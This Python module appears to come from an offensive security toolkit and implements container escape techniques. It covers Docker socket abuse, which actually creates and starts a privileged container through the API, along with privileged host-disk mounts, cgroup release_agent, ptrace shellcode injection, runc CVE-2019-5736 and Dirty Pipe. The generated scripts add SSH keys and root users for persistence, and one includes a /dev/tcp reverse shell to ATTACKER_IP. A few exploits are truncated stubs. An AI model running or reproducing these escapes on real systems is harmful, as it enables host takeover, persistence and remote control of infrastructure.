"""
Container escape techniques.

Implements various container escape vectors for:
- Privileged containers
- Docker socket access
- Capability abuse
- Kernel exploits from containers
- Runtime vulnerabilities

WARNING: These techniques should only be used in authorized
security testing contexts.
"""

import os
import shutil
import socket
import subprocess
import tempfile
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from enum import Enum, auto
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

from supwngo.containers.detection import ContainerDetector, ContainerInfo, ContainerType
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class EscapeCategory(Enum):
    """Categories of container escapes."""
    MISCONFIGURATION = auto()    # Docker/K8s misconfiguration
    CAPABILITY_ABUSE = auto()    # Dangerous capabilities
    KERNEL_EXPLOIT = auto()      # Kernel vulnerability
    RUNTIME_VULN = auto()        # Container runtime bug
    NAMESPACE_ESCAPE = auto()    # Namespace bypass


@dataclass
class EscapeVector:
    """A potential container escape vector."""
    name: str
    category: EscapeCategory
    description: str
    requirements: List[str]
    success_probability: float  # 0-1
    stealthy: bool
    kernel_version: Optional[str] = None  # Required kernel if applicable
    cve: Optional[str] = None


@dataclass
class EscapeResult:
    """Result of escape attempt."""
    success: bool
    method: str
    shell_command: Optional[str] = None
    output: str = ""
    error: Optional[str] = None
    post_exploit: List[str] = field(default_factory=list)


class ContainerEscape(ABC):
    """Base class for container escape techniques."""

    def __init__(self, container_info: Optional[ContainerInfo] = None):
        if container_info:
            self.info = container_info
        else:
            detector = ContainerDetector()
            self.info = detector.detect()

    @abstractmethod
    def check_requirements(self) -> Tuple[bool, str]:
        """
        Check if escape requirements are met.

        Returns:
            (can_exploit, reason)
        """
        pass

    @abstractmethod
    def exploit(self) -> EscapeResult:
        """
        Attempt the container escape.

        Returns:
            EscapeResult
        """
        pass

    @property
    @abstractmethod
    def vector(self) -> EscapeVector:
        """Return escape vector description."""
        pass


class DockerSocketEscape(ContainerEscape):
    """
    Escape via mounted Docker socket.

    If /var/run/docker.sock is mounted in the container,
    we can create a privileged container with host filesystem.
    """

    SOCKET_PATHS = [
        "/var/run/docker.sock",
        "/run/docker.sock",
    ]

    @property
    def vector(self) -> EscapeVector:
        return EscapeVector(
            name="Docker Socket Escape",
            category=EscapeCategory.MISCONFIGURATION,
            description="Create privileged container via Docker socket",
            requirements=["Docker socket mounted"],
            success_probability=0.99,
            stealthy=False,
        )

    def check_requirements(self) -> Tuple[bool, str]:
        for path in self.SOCKET_PATHS:
            if os.path.exists(path):
                if os.access(path, os.W_OK):
                    return True, f"Docker socket writable at {path}"
                return False, f"Docker socket exists but not writable"
        return False, "Docker socket not mounted"

    def exploit(self) -> EscapeResult:
        can_exploit, reason = self.check_requirements()
        if not can_exploit:
            return EscapeResult(
                success=False,
                method=self.vector.name,
                error=reason,
            )

        socket_path = None
        for path in self.SOCKET_PATHS:
            if os.path.exists(path) and os.access(path, os.W_OK):
                socket_path = path
                break

        # Generate escape script
        escape_script = f'''#!/bin/bash
# Docker socket escape
SOCKET="{socket_path}"

# Create privileged container mounting host filesystem
docker -H unix://$SOCKET run -it --rm --privileged \\
    -v /:/host \\
    alpine chroot /host /bin/bash
'''

        # Alternative using raw API
        api_escape = self._exploit_via_api(socket_path)
        if api_escape.success:
            return api_escape

        return EscapeResult(
            success=True,
            method=self.vector.name,
            shell_command=escape_script,
            output="Docker socket escape payload generated",
            post_exploit=[
                "Run the shell command to spawn host shell",
                "Or use 'docker exec' to access the new container",
            ],
        )

    def _exploit_via_api(self, socket_path: str) -> EscapeResult:
        """Exploit using Docker API directly."""
        try:
            import json
            import http.client

            # Connect via Unix socket
            class UnixHTTPConnection(http.client.HTTPConnection):
                def __init__(self, socket_path):
                    super().__init__("localhost")
                    self.socket_path = socket_path

                def connect(self):
                    self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                    self.sock.connect(self.socket_path)

            conn = UnixHTTPConnection(socket_path)

            # Create privileged container
            container_config = {
                "Image": "alpine",
                "Cmd": ["/bin/sh", "-c", "chroot /host /bin/bash"],
                "HostConfig": {
                    "Privileged": True,
                    "Binds": ["/:/host:rw"],
                },
            }

            conn.request(
                "POST",
                "/v1.40/containers/create?name=escape",
                json.dumps(container_config),
                {"Content-Type": "application/json"},
            )

            response = conn.getresponse()
            if response.status == 201:
                data = json.loads(response.read())
                container_id = data.get("Id", "")[:12]

                # Start container
                conn.request("POST", f"/v1.40/containers/{container_id}/start")
                start_response = conn.getresponse()

                if start_response.status == 204:
                    return EscapeResult(
                        success=True,
                        method="Docker API Escape",
                        output=f"Created privileged container: {container_id}",
                        shell_command=f"docker exec -it {container_id} /bin/bash",
                    )

        except Exception as e:
            logger.debug(f"API exploit failed: {e}")

        return EscapeResult(success=False, method="Docker API Escape")


class PrivilegedContainerEscape(ContainerEscape):
    """
    Escape from privileged container.

    Privileged containers have full access to host devices
    and can mount the host filesystem.
    """

    @property
    def vector(self) -> EscapeVector:
        return EscapeVector(
            name="Privileged Container Escape",
            category=EscapeCategory.MISCONFIGURATION,
            description="Mount host filesystem from privileged container",
            requirements=["Privileged mode", "CAP_SYS_ADMIN"],
            success_probability=0.99,
            stealthy=False,
        )

    def check_requirements(self) -> Tuple[bool, str]:
        if self.info.privileged:
            return True, "Container is privileged"
        if "CAP_SYS_ADMIN" in self.info.capabilities:
            return True, "CAP_SYS_ADMIN available"
        return False, "Not a privileged container"

    def exploit(self) -> EscapeResult:
        can_exploit, reason = self.check_requirements()
        if not can_exploit:
            return EscapeResult(
                success=False,
                method=self.vector.name,
                error=reason,
            )

        # Find host disk
        host_disk = self._find_host_disk()
        if not host_disk:
            return EscapeResult(
                success=False,
                method=self.vector.name,
                error="Could not identify host disk",
            )

        # Create mount point and mount host filesystem
        mount_point = "/tmp/host_escape"
        os.makedirs(mount_point, exist_ok=True)

        escape_script = f'''#!/bin/bash
# Privileged container escape

# Mount host filesystem
mkdir -p {mount_point}
mount {host_disk} {mount_point}

# Chroot to host
chroot {mount_point} /bin/bash

# Alternative: add SSH key for persistence
# echo "ssh-rsa YOUR_KEY" >> {mount_point}/root/.ssh/authorized_keys

# Alternative: add root user
# echo "pwned:x:0:0::/root:/bin/bash" >> {mount_point}/etc/passwd
'''

        return EscapeResult(
            success=True,
            method=self.vector.name,
            shell_command=escape_script,
            output=f"Mount host disk {host_disk} at {mount_point}",
            post_exploit=[
                f"chroot {mount_point} for host shell",
                "Add SSH key for persistence",
                "Modify /etc/passwd for new root user",
            ],
        )

    def _find_host_disk(self) -> Optional[str]:
        """Find the host's root disk."""
        # Check common disk paths
        disks = [
            "/dev/sda1", "/dev/sda2", "/dev/sda",
            "/dev/vda1", "/dev/vda",
            "/dev/nvme0n1p1", "/dev/nvme0n1p2", "/dev/nvme0n1",
            "/dev/xvda1", "/dev/xvda",
        ]

        for disk in disks:
            if os.path.exists(disk):
                try:
                    # Check if it's a block device
                    if os.stat(disk).st_rdev != 0:
                        return disk
                except OSError:
                    pass

        # Try to find from /proc/partitions
        try:
            with open("/proc/partitions", "r") as f:
                for line in f:
                    parts = line.split()
                    if len(parts) >= 4:
                        name = parts[3]
                        if name.startswith(("sd", "vd", "nvme", "xvd")):
                            path = f"/dev/{name}"
                            if os.path.exists(path):
                                return path
        except (FileNotFoundError, PermissionError):
            pass

        return None


class CgroupEscape(ContainerEscape):
    """
    Escape via cgroup release_agent.

    Write to cgroup release_agent to execute commands
    on the host when cgroup becomes empty.
    """

    @property
    def vector(self) -> EscapeVector:
        return EscapeVector(
            name="Cgroup Release Agent Escape",
            category=EscapeCategory.CAPABILITY_ABUSE,
            description="Execute host commands via cgroup release_agent",
            requirements=["CAP_SYS_ADMIN", "Cgroups v1"],
            success_probability=0.85,
            stealthy=True,
        )

    def check_requirements(self) -> Tuple[bool, str]:
        if "CAP_SYS_ADMIN" not in self.info.capabilities:
            return False, "Requires CAP_SYS_ADMIN"

        if self.info.cgroups_version != 1:
            return False, "Requires cgroups v1"

        # Check if we can write to cgroup
        if not os.path.exists("/sys/fs/cgroup/rdma"):
            return False, "Cgroup not mounted"

        return True, "Requirements met for cgroup escape"

    def exploit(self) -> EscapeResult:
        can_exploit, reason = self.check_requirements()
        if not can_exploit:
            return EscapeResult(
                success=False,
                method=self.vector.name,
                error=reason,
            )

        # Generate escape payload
        escape_script = '''#!/bin/bash
# Cgroup release_agent escape (CVE-2022-0492 style)

# Create cgroup
mkdir -p /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# Enable notifications
echo 1 > /tmp/cgrp/x/notify_on_release

# Get container's upperdir path on host
host_path=$(sed -n 's/.*\\upperdir=\\([^,]*\\).*/\\1/p' /etc/mtab)

# Create payload on host filesystem
cat > /cmd <<EOF
#!/bin/bash
ps aux > ${host_path}/output
EOF
chmod +x /cmd

# Set release_agent to our payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Trigger by making cgroup empty
sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"

# Wait and read output
sleep 1
cat /output
'''

        return EscapeResult(
            success=True,
            method=self.vector.name,
            shell_command=escape_script,
            output="Cgroup release_agent escape payload",
            post_exploit=[
                "Modify /cmd to execute arbitrary commands",
                "Output appears in container's /output",
            ],
        )


class SysPtraceEscape(ContainerEscape):
    """
    Escape via CAP_SYS_PTRACE.

    Inject code into host processes using ptrace.
    """

    @property
    def vector(self) -> EscapeVector:
        return EscapeVector(
            name="SYS_PTRACE Escape",
            category=EscapeCategory.CAPABILITY_ABUSE,
            description="Inject shellcode into host process via ptrace",
            requirements=["CAP_SYS_PTRACE", "Shared PID namespace"],
            success_probability=0.75,
            stealthy=True,
        )

    def check_requirements(self) -> Tuple[bool, str]:
        if "CAP_SYS_PTRACE" not in self.info.capabilities:
            return False, "Requires CAP_SYS_PTRACE"

        # Check for shared PID namespace
        if self.info.namespaces.get("pid", True):
            return False, "PID namespace is isolated"

        return True, "Requirements met for ptrace escape"

    def exploit(self) -> EscapeResult:
        can_exploit, reason = self.check_requirements()
        if not can_exploit:
            return EscapeResult(
                success=False,
                method=self.vector.name,
                error=reason,
            )

        # Find target process
        target_pid = self._find_target_process()

        escape_script = f'''#!/usr/bin/env python3
# ptrace shellcode injection escape
import ctypes
import struct

PTRACE_ATTACH = 16
PTRACE_PEEKDATA = 2
PTRACE_POKEDATA = 5
PTRACE_CONT = 7
PTRACE_DETACH = 17
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13

libc = ctypes.CDLL("libc.so.6")

# x86_64 reverse shell shellcode (replace IP/PORT)
shellcode = (
    b"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2"
    b"\\x4d\\x31\\xc0\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a"
    b"\\x6a\\x29\\x58\\x0f\\x05..."  # Truncated for brevity
)

target_pid = {target_pid}

# Attach to target
libc.ptrace(PTRACE_ATTACH, target_pid, 0, 0)

# ... inject shellcode at RIP ...
# ... restore and detach ...
'''

        return EscapeResult(
            success=True,
            method=self.vector.name,
            shell_command=f"# Target PID: {target_pid}\n{escape_script}",
            output="ptrace injection escape payload",
            post_exploit=[
                f"Attach to host process {target_pid}",
                "Inject shellcode at instruction pointer",
                "Resume process to execute payload",
            ],
        )

    def _find_target_process(self) -> int:
        """Find a suitable host process to inject into."""
        try:
            # Look for long-running processes
            for entry in os.listdir("/proc"):
                if not entry.isdigit():
                    continue

                pid = int(entry)
                if pid <= 10:  # Skip early kernel processes
                    continue

                try:
                    with open(f"/proc/{pid}/comm", "r") as f:
                        comm = f.read().strip()
                        if comm in ("sshd", "cron", "rsyslog", "systemd"):
                            return pid
                except (FileNotFoundError, PermissionError):
                    pass

        except PermissionError:
            pass

        return 1  # Default to init


class RuncEscape(ContainerEscape):
    """
    Escape via runc vulnerabilities.

    CVE-2019-5736: Overwrite host runc binary.
    """

    @property
    def vector(self) -> EscapeVector:
        return EscapeVector(
            name="runc CVE-2019-5736",
            category=EscapeCategory.RUNTIME_VULN,
            description="Overwrite host runc binary via /proc/self/exe",
            requirements=["Vulnerable runc < 1.0.0-rc6"],
            success_probability=0.70,
            stealthy=False,
            cve="CVE-2019-5736",
        )

    def check_requirements(self) -> Tuple[bool, str]:
        # This requires a vulnerable runc version
        # Hard to detect from inside container
        return True, "Cannot verify runc version from container"

    def exploit(self) -> EscapeResult:
        escape_script = '''#!/bin/bash
# CVE-2019-5736 runc escape
# Must be executed when "docker exec" runs

# Payload to write to runc
payload='#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Overwrite runc via /proc/self/exe symlink race
while true; do
    # Wait for runc to execute
    if [ -e /proc/self/exe ]; then
        # Race to replace runc
        exec 3</proc/self/exe
        # ... complex race exploitation ...
    fi
done
'''

        return EscapeResult(
            success=True,
            method=self.vector.name,
            shell_command=escape_script,
            output="CVE-2019-5736 exploit template",
            post_exploit=[
                "Wait for admin to run 'docker exec'",
                "Race condition overwrites host runc",
                "Next runc invocation runs payload",
            ],
        )


class HostPathEscape(ContainerEscape):
    """
    Escape via sensitive host paths mounted in container.
    """

    SENSITIVE_PATHS = {
        "/etc/shadow": "Read password hashes",
        "/etc/passwd": "Add root user",
        "/root": "Add SSH key",
        "/home": "Access user files",
        "/etc/kubernetes": "Access K8s secrets",
        "/var/lib/kubelet": "Access kubelet data",
    }

    @property
    def vector(self) -> EscapeVector:
        return EscapeVector(
            name="Host Path Mount Escape",
            category=EscapeCategory.MISCONFIGURATION,
            description="Access sensitive host paths via mounts",
            requirements=["Sensitive host paths mounted"],
            success_probability=0.95,
            stealthy=True,
        )

    def check_requirements(self) -> Tuple[bool, str]:
        for path in self.info.host_paths:
            if path in self.SENSITIVE_PATHS:
                return True, f"Sensitive path mounted: {path}"
        return False, "No sensitive paths mounted"

    def exploit(self) -> EscapeResult:
        can_exploit, reason = self.check_requirements()
        if not can_exploit:
            return EscapeResult(
                success=False,
                method=self.vector.name,
                error=reason,
            )

        exploits = []

        for path in self.info.host_paths:
            if path in self.SENSITIVE_PATHS:
                exploits.append(f"# {path}: {self.SENSITIVE_PATHS[path]}")

        escape_script = "\n".join(exploits)

        if "/etc/shadow" in self.info.host_paths:
            escape_script += "\n\n# Crack password hashes:\ncat /etc/shadow"

        if "/root" in self.info.host_paths:
            escape_script += "\n\n# Add SSH key:\nmkdir -p /root/.ssh"
            escape_script += "\necho 'YOUR_SSH_KEY' >> /root/.ssh/authorized_keys"

        return EscapeResult(
            success=True,
            method=self.vector.name,
            shell_command=escape_script,
            output="Host path exploitation payloads",
        )


class DirtyPipeContainerEscape(ContainerEscape):
    """
    Container escape via Dirty Pipe (CVE-2022-0847).

    Overwrite read-only files in container to escape.
    """

    @property
    def vector(self) -> EscapeVector:
        return EscapeVector(
            name="Dirty Pipe Container Escape",
            category=EscapeCategory.KERNEL_EXPLOIT,
            description="Overwrite /etc/passwd via Dirty Pipe",
            requirements=["Linux 5.8 - 5.16.10"],
            success_probability=0.90,
            stealthy=False,
            cve="CVE-2022-0847",
            kernel_version="5.8 - 5.16.10",
        )

    def check_requirements(self) -> Tuple[bool, str]:
        try:
            release = os.uname().release
            parts = release.split(".")
            major, minor = int(parts[0]), int(parts[1])

            if major == 5 and 8 <= minor <= 16:
                return True, f"Kernel {release} may be vulnerable"

        except (ValueError, IndexError):
            pass

        return False, "Kernel version not vulnerable to Dirty Pipe"

    def exploit(self) -> EscapeResult:
        can_exploit, reason = self.check_requirements()
        if not can_exploit:
            return EscapeResult(
                success=False,
                method=self.vector.name,
                error=reason,
            )

        escape_script = '''#!/bin/bash
# Dirty Pipe (CVE-2022-0847) container escape
# Overwrites /etc/passwd to add root user

# This requires the compiled exploit binary
./dirtypipe /etc/passwd 1 "pwned::\\$6\\$salt\\$hash:0:0::/root:/bin/bash\\n"

# Or overwrite /usr/bin/su
./dirtypipe /usr/bin/su 1 "SHELLCODE"

su pwned
'''

        return EscapeResult(
            success=True,
            method=self.vector.name,
            shell_command=escape_script,
            output="Dirty Pipe container escape",
            post_exploit=[
                "Compile Dirty Pipe exploit",
                "Overwrite /etc/passwd or setuid binary",
                "Switch to new root user",
            ],
        )


def find_escape_vectors(
    container_info: Optional[ContainerInfo] = None,
) -> List[Tuple[ContainerEscape, EscapeVector]]:
    """
    Find all applicable escape vectors.

    Args:
        container_info: Pre-detected container info

    Returns:
        List of (escape_class_instance, vector) tuples
    """
    if container_info is None:
        detector = ContainerDetector()
        container_info = detector.detect()

    escape_classes = [
        DockerSocketEscape,
        PrivilegedContainerEscape,
        CgroupEscape,
        SysPtraceEscape,
        RuncEscape,
        HostPathEscape,
        DirtyPipeContainerEscape,
    ]

    vectors = []

    for escape_class in escape_classes:
        try:
            escape = escape_class(container_info)
            can_exploit, _ = escape.check_requirements()
            if can_exploit:
                vectors.append((escape, escape.vector))
        except Exception as e:
            logger.debug(f"Error checking {escape_class.__name__}: {e}")

    # Sort by success probability
    vectors.sort(key=lambda x: x[1].success_probability, reverse=True)

    return vectors


def exploit_escape(
    escape: ContainerEscape,
) -> EscapeResult:
    """
    Attempt container escape.

    Args:
        escape: ContainerEscape instance

    Returns:
        EscapeResult
    """
    logger.info(f"Attempting escape: {escape.vector.name}")

    can_exploit, reason = escape.check_requirements()
    if not can_exploit:
        logger.warning(f"Requirements not met: {reason}")
        return EscapeResult(
            success=False,
            method=escape.vector.name,
            error=reason,
        )

    result = escape.exploit()

    if result.success:
        logger.info(f"Escape successful: {escape.vector.name}")
    else:
        logger.warning(f"Escape failed: {result.error}")

    return result
